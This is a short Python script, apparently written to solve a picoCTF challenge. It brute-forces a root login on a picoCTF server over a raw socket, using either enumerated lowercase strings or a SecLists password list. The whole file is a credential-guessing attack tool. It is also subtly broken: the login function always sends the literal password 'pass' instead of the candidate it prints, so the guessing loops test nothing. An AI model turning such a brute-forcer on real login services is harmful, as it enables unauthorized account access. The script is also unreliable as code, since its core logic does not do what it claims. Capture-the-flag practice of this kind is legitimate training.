#!/usr/bin/env python3


import itertools
import string




def tryPass(p):
    print('Try password:',p)
    import socket

    HOST = '2018shell2.picoctf.com'  # The server's hostname or IP address
    PORT = 38860        # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        # s.sendall(b'Hello, world')
        data = s.recv(8024).decode('ASCII')
        if data == 'Username: ':
        
            s.sendall(b'root\n')
            data = s.recv(1024).decode('ASCII')
            # print(data)
            if ( data == 'Password: '):
                s.sendall(b'pass\n')
                data = s.recv(1024).decode('ASCII')
                # print(data)
                if ('Failed Login' in data):
                    return 0
                    # print(0)
                else:
                    return 1
                    # print(1)



def guess_password():
    chars = string.ascii_lowercase + string.digits
    chars = string.ascii_lowercase
    
    attempts = 0
    for password_length in range(2, 5):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            guess = ''.join(guess)

            if tryPass(guess):
                return 'password is {}. found in {} guesses.'.format(guess, attempts)
                break
            print(guess, attempts)

def passDict(file):
    with open('./passwdList/' + file) as f:
        lines = [line.strip() for line in f]

    for p in lines:
        if tryPass(p):
            print('Password is:',p) 
            break
        else:
            pass


# print(tryPass('changeme'))

# # guess_password()
# passDict('1000000-password-seclists.txt')
print('%c'*64)
print('\n')